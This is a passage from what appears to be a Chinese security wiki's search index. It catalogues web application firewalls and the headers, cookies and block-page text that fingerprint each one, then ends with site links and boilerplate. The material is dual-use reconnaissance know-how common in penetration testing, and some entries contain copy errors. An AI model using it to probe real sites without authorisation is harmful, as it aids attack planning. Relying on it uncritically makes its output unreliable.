value IF_WAF. Blocked response content contains warning further investigation and remediation with a screenshot of this page. Response headers contain a unique header X-Version. Instart DX Detectability: Easy Detection Methodology: Response headers contain X-Instart-Request-ID unique header. Response headers contain X-Instart-WL unique header fingerprint. Response headers contain X-Instart-Cache unique header fingerprint. Blocked response page contains The requested URL was rejected. Please consult with your administrator. text. ISA Server Detectability: Difficult Detection Methodology: Response page contains: The ISA Server denied the specified Uniform Resource Locator (URL) text snippet. The server denied the specified Uniform Resource Locator (URL). Contact the server administrator. text snippet Janusec Application Gateway Detectability: Easy Detection Methodology: Blocked response page has image displaying JANUSEC name and logo. Blocked response page displays Janusec Application Gateway on malicious requests. Jiasule Detectability: Easy Detection Methodology: Blocked response page contains reference to static.jiasule.com/static/js/http_error.js URL. Set-Cookie header has cookie field __jsluid= or jsl_trackingin response headers. Server header has jiasule-WAF keywords. Blocked response content has notice-jiasule keyword. KeyCDN Detectability: Easy Detection Methodology: Server header contains KeyCDN keyword. KnownSec Detectability: Easy Detection Methodology: Blocked response page displays ks-waf-error.png image (view source to see). KONA Site Defender (Akamai) Detectability: Easy Detection Methodology: Server header contains AkamaiGHost keyword. LiteSpeed Detectability: Easy Detection Methodology: Server header has value set to LiteSpeed. Response page contains: Proudly powered by LiteSpeed Web Server text. Reference to http://www.litespeedtech.com/error-page Access to resource on this server is denied. Malcare Detectability: Moderate Detection Methodology: Blocked response page may contains: Blocked because of Malicious Activities text snippet. Firewall powered by MalCare text snippet. MissionControl Application Shield Detectability: Easy Detection Methodology: Server header field contains Mission Control Application Shield value. ModSecurity Detectability: Moderate/Difficult Detection Methodology: Blocked response page contains: This error was generated by Mod_Security text snippet. One or more things in your request were suspicious text snippet. rules of the mod_security module text snippet. mod_security rules triggered text snippet. Reference to /modsecurity-errorpage/ directory. Server header may contain Mod_Security or NYOB keywords. Sometimes, the response code to an attack is 403 while the response phrase is ModSecurity Action. ModSecurity CRS Detectability: Difficult Detection Methodology: Blockpage occurs on adding a separate request header X-Scanner when set to a particular paranoa level. NAXSI Detectability: Easy Detection Methodology: Blocked response page conatins This Request Has Been Blocked By NAXSI. Response headers contain unusual field X-Data-Origin with value naxsi/waf keyword. Server header contains naxsi/waf keyword value. Blocked response page may contain NAXSI blocked information error code. Nemesida Detectability: Difficult Detection Methodology: Blocked response page conatins Suspicious activity detected. Access to the site is blocked.. Contains reference to email nwaf@{site.tld} Netcontinuum Detectability: Moderate Detection Methodology: Session cookies contain NCI__SessionId= cookie field name. NetScaler AppFirewall Detectability: Moderate Detection Methodology: Response headers may contain Connection: header field name jumbled to nnCoection: nsaf= cookie field name. citrix_ns_id field name. NSC keyword. NS-CACHE field value. NevisProxy Detectability: Moderate Detection Methodology: Response header cookies contain Navajo keyword. NewDefend Detectability: Easy Detection Methodology: Response page contains: Reference to http://www.newdefend.com/feedback/misinformation/ URL. Reference to /nd_block/ directory. Server header contains NewDefend keyword. Nexusguard Detectability: Easy Detection Methodology: Blocked response page has reference to speresources.nexusguard.com/wafpage/index.html URL. NinjaFirewall Detectability: Moderate Detection Methodology: Response page title contains NinjaFirewall: 403 Forbidden. Response page contains: For security reasons, it was blocked and logged text snippet. NinjaFirewall keyword in title. Returns a 403 Forbidden response upon malicious requests. NSFocus Detectability: Easy Detection Methodology: Server header contain NSFocus keyword. NullDDoS Detectability: Easy Detection Methodology: Server header contains the NullDDoS System keyword. onMessage Shield Detectability: Easy Detection Methodology: Response headers contain header X-Engine field with value onMessage Shield. Blocked response page contains: Blackbaud K-12 conducts routine maintenance keyword. This site is protected by an enhanced security system. Reference to https://status.blackbaud.com URL. Reference to https://maintenance.blackbaud.com URL. OpenResty Lua WAF Detectability: Easy Detection Methodology: Server header contains openresty/{version} keyword. Blocked response page contains openresty/{version} text. Blocked response code returned is 406 Not Acceptable. Palo Alto Detectability: Moderate Detection Methodology: Blocked response page contains Virus/Spyware Download Blocked. Response page might contain Palo Alto Next Generation Security Platform text snippet. PentaWAF Detectability: Easy Detection Methodology: Server header contains PentaWAF/{version} keyword. Blocked response page contains text PentaWAF/{version}. PerimeterX Detectability: Easy Detection Methodology: Blocked response page contains reference to https://www.perimeterx.com/whywasiblocked URL. pkSecurityModule IDS Detectability: Moderate Detection Methodology: Response content may contain pkSecurityModule: Security.Alert. A safety critical request was discovered and blocked text snippet. Positive Technologies Application Firewall Detectability: Difficult Detection Methodology: Blocked response page contains Forbidden in h1 followed by: Request ID: in format yyyy-mm-dd-hh-mm-ss-{ref. code} PowerCDN Detectability: Moderate Detection Methodology: Response headers may contain Via header with content powercdn.com. X-Cache header with content powercdn.com. X-CDN header with content PowerCDN. Profense Detectability: Easy Detection Methodology: Set-Cookie headers contain PLBSID= cookie field name. Server header contain Profense keyword. Proventia (IBM) Detectability: Difficult Detection Methodology: Blocked response page might contain to request does not match Proventia rules text snippet. Puhui Detectability: Easy Detection Methodology: Server header contain PuhuiWAF keyword. Qiniu CDN Detectability: Easy Detection Methodology: Response content may contain Response headers contain unusual header X-Qiniu-CDN with value set to either 0 or 1. Radware Appwall Detectability: Moderate Detection Methodology: Response page contains the following text snippet: Unauthorized Activity Has Been Detected. and Case Number Blocked response page has reference to radwarealerting@{site.tld} email. Blocked response page has title set to Unauthorized Request Blocked. Response headers may contain X-SL-CompState header field name. Reblaze Detectability: Moderate Detection Methodology: Cookies in response headers contain rbzid= header field name. Server field value might contain Reblaze Secure Web Gateway text snippet. Response page contains: Access Denied (403) in bold. Current session has been terminated text. For further information, do not hesitate to contact us. Request Validation Mode Detectability: Easy Detection Methodology: A firewall found specifically on ASP.NET websites and none others. Response page contains either of the following text snippet: ASP.NET has detected data in the request that is potentially dangerous. Request Validation has detected a potentially dangerous client input value. HttpRequestValidationException. Blocked response code returned is always 500 Internal Error. RSFirewall Detectability: Easy Detection Methodology: Response page contains: COM_RSFIREWALL_403_FORBIDDEN keyword. COM_RSFIREWALL_EVENT keyword. Sabre Detectability: Easy Detection Methodology: Returns status code 500 Internal Error upon malicious requests. Response content has: Contact email dxsupport@sabre.com. Your request has been blocked bold warning. clicking the above email link will automatically add some important details to the email for us to investigate the problem text snippet. Safe3 Detectability: Easy Detection Methodology: Response headers contain: X-Powered-By header has field value Safe3WAF. Server header contains field value set to Safe3 Web Firewall. Response page contains Safe3waf keyword. SafeDog Detectability: Easy/Moderate Detection Methodology: Server header in response may contain: WAF/2.0 keyword. safedog field value. SecKing Detectability: Easy/Moderate Detection Methodology: Server header in response may contain: SECKINGWAF keyword. SECKING/{version} field value. SecuPress Detectability: Easy Detection Methodology: Response content may contain: SecuPress as text. Block ID: Bad URL Contents as text. Response code returned is 503 Service Unavailable. Secure Entry Detectability: Easy Detection Methodology: Server header contains value set to Secure Entry Server. SecureIIS Detectability: Easy Detection Methodology: Response page contains either of the following text snippet: Image displaying beyondtrust logo. Download SecureIIS Personal Edition Reference to http://www.eeye.com/SecureIIS/ URL. SecureIIS Error text snippet. SecureSphere Detectability: Difficult Detection Methodology: Response page contains the following text snippet: Error in h2 text. Title contains only text as Error. Contact support for additional information. text. SEnginx Detectability: Easy Detection Methodology: Blocked response page contains SENGINX-ROBOT-MITIGATION keyword. ServerDefender VP Detectability: Easy Detection Methodology: Blocked response contains X-Pint header field with p80 keyword. Shadow Daemon Detectability: Difficult Detection Methodology: Blocked response page contains request forbidden by administrative rules. keyword. ShieldSecurity Detectability: Difficult Detection Methodology: Blocked response page contains: You were blocked by the Shield. text. Something in the URL, Form or Cookie data wasn't appropriate text snippet. Warning: You have {number} remaining transgression(s) against this site. Seriously stop repeating what you are doing or you will be locked out. SiteGround Detectability: Difficult Detection Methodology: Blocked response page contains The page you are trying to access is restricted due to a security rule text snippet. SiteGuard (JP Secure) Detectability: Difficult Detection Methodology: Response page contains: Powered by SiteGuard text snippet. The server refuse to browse the page. text snippet. The URL may not be correct. Please confirm the value. SiteLock TrueShield Detectability: Easy Detection Methodology: Blocked response page source contains the following: Reference to www.sitelock.com URL. Sitelock is leader in Business Website Security Services. text. sitelock-site-verification keyword. sitelock_shield_logo image. SonicWall Detectability: Easy Detection Methodology: Server header contain SonicWALL keyword value. Blocked response page contains either of the following text snippet: Image displaying Dell logo. This request is blocked by the SonicWALL. Web Site Blocked text snippet. nsa_banner as keyword. :p Sophos UTM Detectability: Easy Detection Methodology: Blocked response page contains Powered by UTM Web Protection keyword. SquareSpace Detectability: Difficult Detection Methodology: Response code returned is 404 Not Found upon malicious requests. Blocked response page contains either of the following text snippet: BRICK-50 keyword. 404 Not Found text snippet. SquidProxy IDS Detectability: Easy Detection Methodology: Server header contains field value squid/{version}. Blocked response page contains Access control configuration prevents your request from being allowed at this time.. StackPath Detectability: Easy Detection Methodology: Contains image displaying StackPath logo. Blocked response page contains You performed an action that triggered the service and blocked your request. Stingray Detectability: Difficult Detection Methodology: Blocked response code returns 403 Forbidden or 500 Internal Error. Response headers contain the X-Mapping header field name. Sucuri CloudProxy Detectability: Easy Detection Methodology: Response headers may contain Sucuri or Cloudproxy keywords. Blocked response page contains the following text snippet: Access Denied - Sucuri Website Firewall text. Reference to https://sucuri.net/privacy-policy URL. Sometimes the email cloudproxy@sucuri.net. Contains copyright notice ;copy {year} Sucuri Inc. Response headers contains X-Sucuri-ID header along with normal requests. Synology Cloud Detectability: Easy Detection Methodology: Blocked response page has Copyright (c) 2019 Synology Inc. All rights reserved.as text. Tencent Cloud Detectability: Moderate Detection Methodology: Blocked response code returns 405 Method Not Allowed error. Blocked response page contains reference to waf.tencent-cloud.com URL. Teros Detectability: Difficult Detection Methodology: Response headers contain cookie field st8id. TrafficShield Detectability: Moderate Detection Methodology: Server might contain F5-TrafficShield keyword. ASINFO= value might be detected in response cookies. TransIP Detectability: Easy Detection Methodology: Response headers contain unique header X-TransIP-Backend. Response headers contain another header X-TransIP-Balancer. UCloud UEWaf Detectability: Easy Detection Methodology: Response content might contain: Reference to /uewaf_deny_pages/default/img/ inurl directory. ucloud.cn URL. Response headers returned has Server header set to uewaf/{version}. URLMaster SecurityCheck Detectability: Moderate Detection Methodology: Response headers might contain: UrlMaster keyword. UrlRewriteModule keyword. SecurityCheck keyword. Blocked response code returned is 400 Bad Request text snippet. URLScan Detectability: Moderate Detection Methodology: Blocked response page contains: Rejected-by-URLScan text snippet. Server Erro in Application as heading. Module: IIS Web Core in table. USP Secure Entry Detectability: Moderate Detection Methodology: Response headers contain Secure Entry Server field value. Varnish (OWASP) Detectability: Easy Detection Methodology: Malicious request returns 404 Not Found Error. Response page contains: Request rejected by xVarnish-WAF text snippet. Varnish CacheWall Detectability: Easy Detection Methodology: Response page contains: Error 403 Naughty, not Nice! as heading. Varnish cache Server as text. Viettel Detectability: Easy Detection Methodology: Response page contains: Block page has title set to Access denied · Viettel WAF. Reference to https://cloudrity.com.vn/ URL. Response page contains keywords Viettel WAF system. Contact information reference to https://cloudrity.com.vn/customer/#/contact URL. VirusDie Detectability: Easy Detection Methodology: Response page contains: http://cdn.virusdie.ru/splash/firewallstop.png picture. copy; Virusdie.ru copyright notice. Response page title contains Virusdie keyword. Page metadata contains name=\"FW_BLOCK\" keyword WallArm Detectability: Moderate Detection Methodology: Server headers contain nginx-wallarm value. WatchGuard IPS Detectability: Easy Detection Methodology: Server headers may contain WatchGuard field value. Blocked response page contains: Request denied by WatchGuard Firewall text. WatchGuard Technologies Inc. as footer. WebARX Security Detectability: Easy Detection Methodology: Restricted to specifically WordPress sites only. Blocked response page contains: This request has been blocked by WebARX Web Application Firewall text. Reference to /wp-content/plugins/webarx/ directory where it is installed. WebKnight Detectability: Easy Detection Methodology: Response headers contain WebKnight keyword. Blocked response page contains: WebKnight Application Firewall Alert text warning. AQTRONIX WebKnight text snippet. Blocked response code returned is 999 No Hacking. :p Blocked response code returned is also 404 Hack Not Found. :p WebLand Detectability: Easy Detection Methodology: Server header contains Apache Protected By WebLand WAF keyword. WebRay Detectability: Easy Detection Methodology: Server header contains WebRay-WAF keyword. Response headers may have DrivedBy field with value RaySrv RayEng/{version}. WebSEAL Detectability: Easy Detection Methodology: Server header contain WebSEAL keyword. Blocked response page contains: This is a WebSEAL error message template file text. WebSEAL server received an invalid HTTP request text snippet. WebTotem Detectability: Easy Detection Methodology: Blocked response page contains The current request was blocked by WebTotem. West263CDN Detectability: Easy Detection Methodology: Response headers contain X-Cache header field with WT263CDN value. Wordfence Detectability: Easy Detection Methodology: Response headers contain WebKnight keyword. Blocked response page contains: Generated by Wordfence text snippet. A potentially unsafe operation has been detected in your request to this site text warning. Your access to this site has been limited text warning. This response was generated by Wordfence text snippet. WTS-WAF Detectability: Easy Detection Methodology: Blocked response page title has WTS-WAF keyword. Server header contains wts as value. XLabs Security WAF Detectability: Easy Detection Methodology: Response headers contain X-CDN header field with XLabs Security value. Xuanwudun WAF Detectability: Easy Detection Methodology: Blocked response page contains reference to http://admin.dbappwaf.cn/index.php/Admin/ClientMisinform/ site URL. Yunaq Chuangyu Detectability: Moderate Detection Methodology: Response page has reference to: 365cyd.com or 365cyd.net URL. Reference to help page at http://help.365cyd.com/cyd-error-help.html?code=403. Yundun Detectability: Easy Detection Methodology: Server header contains YUNDUN as value. X-Cache header field contains YUNDUN as value. Response page contains Blocked by YUNDUN Cloud WAF text snippet. Blocked response page contains reference to yundun.com/yd_http_error/ URL. Yunsuo Detectability: Easy Detection Methodology: Blocked response page contains image class reference to yunsuologo. Response headers contain the yunsuo_session field name. YxLink Detectability: Easy Detection Methodology: Response might have yx_ci_session cookie field. Response might have yx_language cookie field. Server header contains Yxlink-WAF field value. ZenEdge Detectability: Easy Detection Methodology: Blocked response page contains reference to /__zenedge/assets/ directory. Server header contain ZENEDGE keyword. Blocked response headers may contain X-Zen-Fury header. ZScaler Detectability: Easy Detection Methodology: Server header has value set to ZScaler. Blocked response page contains: Access Denied: Accenture Policy text. Reference to https://policies.accenture.com URL. Reference to image at https://login.zscloud.net/img_logo_new1.png. Your organization has selected Zscaler to protect you from internet threats. The Internet site you have attempted to access is prohibited. Accenture's webfilters indicate that the site likely contains content considered inappropriate. 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-20 23:00:33 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"link.html":{"url":"link.html","title":"友情链接","keywords":"","body":"友情链接 【链接】雨苁|暗网|黑客|极客|渗透测试|专注信息安全 【链接】黑客街导航网站 【链接】hack学习 【链接】干货集中营 【链接】渗透师导航 【链接】IT同路人网址导航 【链接】小陈's Blog 【链接】WgpSec 狼组安全团队 【链接】keac's Bolg 【链接】北极边界安全 【链接】h4ck1r's Blog 【链接】F组安全交流平台 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-15 23:01:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"about.html":{"url":"about.html","title":"关于我们","keywords":"","body":"三十功名尘与土，八千里路云和月。莫等闲，白了少年头，空悲切。alert(\"三十功名尘与土，八千里路云和月。莫等闲，白了少年头，空悲切。\") 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-22 22:58:01 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"}}